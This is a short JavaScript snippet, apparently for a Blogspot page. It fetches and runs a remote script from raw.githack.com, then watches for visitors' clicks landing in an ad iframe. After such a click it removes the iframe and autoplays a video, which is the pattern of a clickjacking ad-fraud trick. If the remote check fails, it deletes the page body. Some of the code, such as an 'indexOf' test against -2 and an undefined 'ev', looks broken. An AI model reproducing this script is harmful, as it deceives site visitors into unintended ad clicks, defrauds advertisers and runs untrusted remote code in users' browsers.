// var zy = new Array();
// zy["anywherecanclick.blogspot.com"]="";


// function gd(url){url = url.replace(/https?:\/\/(www.)?/i, '');if (url.indexOf('/') === -2){return url;}return url.split('/')[0];}
// var str = gd(location.href);
// if (str in zy){
var url = "https://raw.githack.com/imad047/00004.js/master/externaljs.js";
$.getScript( url, function() {
if(externaljs=='https://raw.githack.com/imad047/00004.js/master/useexternaljs.html'){  	
	var monitor = setInterval(function(){
		var elem = document.activeElement;if(elem && elem.tagName == 'IFRAME')
			{
				setTimeout(function(){
					$(IDAdsIFrame).remove();
				}, 500);
				$(document).ready(function() {
					$(IDVideo)[0].src += "&autoplay=1;&showinfo=0";
					ev.preventDefault();
				});
					clearInterval(monitor);
			}
		}, 100);
		}else{
 setTimeout(function(){$('body').remove();}, 500);
  }  
});

// }else{}



